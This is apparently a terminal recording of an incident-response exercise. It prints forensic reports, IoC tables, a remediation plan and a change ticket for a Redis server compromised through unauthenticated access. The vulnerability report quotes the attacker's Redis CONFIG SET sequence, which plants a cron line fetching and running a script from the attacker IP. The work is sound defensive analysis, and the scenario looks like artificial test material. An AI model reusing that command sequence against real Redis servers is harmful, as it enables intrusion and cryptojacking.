[258.173155, "o", "==> /app/progress.md <==\r\n# DFIR Investigation Progress & Working Checklist\r\n\r\n## Incident Summary\r\n- **Host**: `redis-prod-01`\r\n- **OS**: Debian 12\r\n- **Attacker Origin IP**: `198.51.100.170` (cited in `/disk/var/log/auth.log:208` and `/sas/cti/advisory.txt:5`)\r\n- **Primary Compromise Vector**: Unauthenticated Redis instance bound to all interfaces (`0.0.0.0`) without password authentication (cited in `/disk/etc/redis/redis.conf:3`)\r\n\r\n## Investigation Timeline\r\n\r\n| Timestamp (UTC) | Event Description | Evidence Source / Citation |\r\n|---|---|---|\r\n| 2026-08-11 00:53:46 | Attacker initiates SSH brute-force attack from `198.51.100.170` | `/disk/var/log/auth.log:176` |\r\n| 2026-08-11 00:55:02 | Attacker gains SSH root access via password login from `198.51.100.170` | `/disk/var/log/auth.log:208` |\r\n| 2026-08-11 01:00:00 (approx) | Exploitation of unauthenticated Redis via `CONFIG SET` commands | `/disk/etc/redis/redis.conf:3` and `/sas/cti/advisory.txt:10` |\r\n| 2026-08-11 01:07:05 | Malicious cron task executed, dropping reverse shell / beacon payload | `/disk/var/spool/cron/crontabs/root:4` |\r\n| 2026-08-11 01:10:00 | Cryptominer (`kdevtmpfsi`) deployed and executed (PID 1337) | `/disk/tmp/.redis/kdevtmpfsi:3` |\r\n| 2026-08-11 01:15:00 | Userland rootkit installed via `/etc/ld.so.preload` pointing to `/lib/.hide.so` | `/disk/etc/ld.so.preload:1` |\r\n| 2026-08-11 01:20:00 | Kernel/Loadable module rootkit staged at `/tmp/.redis/exp.so` | `/disk/tmp/.redis/exp.so:3` |\r\n| 2026-08-11 01:25:00 | Anti-forensics / log wiping performed, leaving residual cache artifact | `/disk/var/lib/.cache/.wiped.bin:1` |\r\n\r\n==> /app/intrusion-report.md <==\r\n# Intrusion Report: Post-Compromise Campaign Analysis\r\n\r\n## Executive Summary\r\nOn host `redis-prod-01`, an external threat actor (`198.51.100.170`) gained access by abusing an unauthenticated Redis service exposed to all interfaces (`0.0.0.0`). The attacker leveraged Redis `CONFIG SET` commands to write a persistence payload into the root crontab, dropped an XMRig cryptominer (`kdevtmpfsi`), established userland rootkit persistence via `/etc/ld.so.preload`, staged a loadable module exploit (`exp.so`), and performed log wiping. EDR alerting (`/sas/alerts.json`) detected only the cryptominer process and crontab file, missing the silent `LD_PRELOAD` rootkit, staged module, and log wipe activity.\r\n\r\n## Entities & Indicators of Compromise (IoCs)\r\n\r\n| Indicator Type | Value | Citation |\r\n|---|---|---|\r\n| Attacker Origin IP | `198.51.100.170` | `/disk/var/log/auth.log:208`, `/sas/cti/advisory.txt:5` |\r\n| C2 Infrastructure Domain | `update-redis.example.cn` | `/disk/var/lib/.cache/.wiped.bin:1` |\r\n| Cryptomining Pool | `stratum+tcp://xmr.redis.evil:3333` | `/disk/tmp/.redis/kdevtmpfsi:4`, `/disk/tmp/.redis/exp.so:4` |\r\n| Monero Wallet | `4A00000000000000000031c7d95fb9f3` | `/disk/tmp/.redis/kdevtmpfsi:5`, `/disk/tmp/.redis/exp.so:5` |\r\n| Miner Process File | `/tmp/.redis/kdevtmpfsi` | `/disk/tmp/.redis/kdevtmpfsi:1`, `/sas/alerts.json` (ALERT-01) |\r\n| Staged Exploit Module | `/tmp/.redis/exp.so` | `/disk/tmp/.redis/exp.so:1` |\r\n| Preload Rootkit File | `/etc/ld.so.preload` -> `/lib/.hide.so` | `/disk/etc/ld.so.preload:1` |\r\n| Root Crontab File | `/var/spool/cron/crontabs/root` | `/disk/var/spool/cron/crontabs/root:4`, `/sas/alerts.json` (ALERT-02) |\r\n| Residual Cache Artifact | `/var/lib/.cache/.wiped.bin` | `/disk/var/lib/.cache/.wiped.bin:1` |\r\n\r\n## Comprehensive Attack Chain Mapping (MITRE ATT&CK)\r\n\r\n==> /app/vuln-report.md <==\r\n# Vulnerability-Driven Entry Analysis Report\r\n\r\n## Vulnerability Assessment Summary\r\n- **Vulnerability Status**: No software CVE exploit detected; initial access was enabled by critical configuration weaknesses.\r\n- **SAS Vulnerability Feed**: `/sas/vulns.json` returned an empty set (`[]`).\r\n- **Reconciliation of Change Ticket CHG-5677**: Ticket item #2 incorrectly claimed CVE-2019-0708 (BlueKeep) on RDP. BlueKeep is a Windows Remote Desktop Services CVE, entirely irrelevant to Debian 12 Linux running Redis (`/sas/handoff/change-ticket.md:12`).\r\n\r\n## Detailed Vector & Root Ca"]
[258.173175, "o", "use Analysis\r\n\r\n### 1. Primary Entry Vector: Unauthenticated Redis Remote Access\r\n- **Mechanism**: The host ran a Redis server configured with `protected-mode no`, `bind 0.0.0.0`, and no `requirepass` password set (`/disk/etc/redis/redis.conf:3`).\r\n- **Exploitation Technique**: An attacker on the external network reached TCP port 6379 directly without authentication (`/sas/cti/advisory.txt:10`).\r\n- **Execution Pathway**: The attacker executed Redis administrative commands:\r\n  ```text\r\n  CONFIG SET dir /var/spool/cron/crontabs\r\n  CONFIG SET dbfilename root\r\n  SET payload \"\\n\\n* * * * * root curl hxxp://198.51.100.170/x | sh\\n\\n\"\r\n  SAVE\r\n  ```\r\n- **Evidence**: Verified in root crontab (`/disk/var/spool/cron/crontabs/root:4`) and threat intelligence advisory (`/sas/cti/advisory.txt:10`).\r\n\r\n==> /app/baseline-report.md <==\r\n# Baseline & Configuration Weakness Report\r\n\r\n## Overview\r\nAnalysis of system configuration files on host `redis-prod-01` revealed multiple critical baseline security deficiencies that enabled initial compromise, execution, lateral escalation, and persistent evasion.\r\n\r\n## Identified Baseline Weaknesses\r\n\r\n### 1. Insecure Redis Service Baseline (BAS-01 / CHK-05)\r\n- **Configuration File**: `/disk/etc/redis/redis.conf:3`\r\n- **Current Setting**: `Redis protected-mode no; bind 0.0.0.0; no password set`\r\n- **Baseline Deviation**: CIS / Debian Security Baseline requires:\r\n  1. `bind 127.0.0.1` (or binding strictly to private internal management interfaces).\r\n  2. `protected-mode yes`.\r\n  3. Robust authentication enabled via `requirepass <strong_password>`.\r\n  4. Disabling or renaming dangerous administrative commands (`CONFIG`, `FLUSHALL`, `SAVE`, `EVAL`).\r\n- **Severity**: **CRITICAL**.\r\n- **Evidence**: `/disk/etc/redis/redis.conf:3`, `/sas/baseline.json:1`, `/sas/alerts.json` (ALERT-03).\r\n\r\n### 2. Unrestricted Dynamic Linker Hijacking Vulnerability\r\n- **Configuration File**: `/disk/etc/ld.so.preload:1`\r\n\r\n==> /app/remediation-plan.md <==\r\n# Incident Remediation & Recovery Plan\r\n\r\n## Remediation Strategy\r\nThis plan provides a prioritized, step-by-step remediation procedure for host `redis-prod-01`. In accordance with forensic best practices, **all malicious binaries and configuration hooks are backed up/quarantined prior to removal**, and all steps are accompanied by verification commands.\r\n\r\n---\r\n\r\n## Phase 1: Containment & Network Isolation (Priority 1 — Immediate)\r\n\r\n### Step 1.1: Block External Threat Actor IP\r\n- **Objective**: Block all inbound and outbound traffic to attacker IP `198.51.100.170`.\r\n- **Evidence Citation**: `/disk/var/log/auth.log:208`, `/sas/cti/advisory.txt:5`.\r\n- **Action Commands**:\r\n  ```bash\r\n  iptables -A INPUT -s 198.51.100.170 -j DROP\r\n  iptables -A OUTPUT -d 198.51.100.170 -j DROP\r\n  ```\r\n- **Verification Command**:\r\n  ```bash\r\n  iptables -L -n -v | grep \"198.51.100.170\"\r\n\r\n==> /sas/handoff/change-ticket.md <==\r\n# CHANGE TICKET  CHG-5677  (DRAFT — reconcile against your findings)\r\n\r\n> Reconciled against forensic disk evidence `/disk` and SAS telemetry `/sas`.\r\n\r\n| # | Action | Target | Status | Note |\r\n|---|--------|--------|--------|------|\r\n| 1 | Block source IP inbound | 198.51.100.170 | proposed | Corrected IP from 203.0.113.9 to 198.51.100.170 based on SSH bruteforce/accepted login in `/disk/var/log/auth.log:208` and CTI advisory `/sas/cti/advisory.txt:5` |\r\n| 2 | Enforce Redis auth and bind address | /etc/redis/redis.conf | proposed | Replaced irrelevant BlueKeep CVE with Redis configuration fix: set `protected-mode yes`, bind to local loopback or internal interface, and configure password auth in `/disk/etc/redis/redis.conf:3` |\r\n| 3 | Remove cron miner persistence | /var/spool/cron/crontabs/root | OPEN | Downgraded from DONE to OPEN because cron persistence line remains present in `/disk/var/spool/cron/crontabs/root:4` |\r\n| 4 | Remove LD_PRELOAD preload rootkit | /etc/ld.so.preload | proposed | Added missing silent persistence hook `/etc/ld.so.preload` pointing to `/lib/.hide.so` found in `/disk/etc/ld.so.preload:1` |\r\n| 5 | Terminate miner process and quarantine bin"]
[258.173297, "o", "ary | /tmp/.redis/kdevtmpfsi | proposed | Added running cryptominer binary `/tmp/.redis/kdevtmpfsi` found in `/disk/tmp/.redis/kdevtmpfsi:3` and alerted in `/sas/alerts.json` |\r\n| 6 | Quarantine staged module / rootkit sample | /tmp/.redis/exp.so | proposed | Added missing silent malicious module staged at `/tmp/.redis/exp.so` found in `/disk/tmp/.redis/exp.so:3` |\r\n| 7 | Quarantine anti-forensic wiped cache file | /var/lib/.cache/.wiped.bin | proposed | Added missing silent log wipe artifact found in `/disk/var/lib/.cache/.wiped.bin:1` |\r\n\r\n## Reviewer checklist\r\n- [x] Every action maps to a cited artifact under /disk or /sas\r\n- [x] Fix the wrong IP (row 1) and wrong CVE (row 2)\r\n- [x] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence\r\n- [x] Add the silent (non-alerted) artifacts the prior shift missed\r\n\u001b[?2004hroot@1418f4c49950:/app# "]
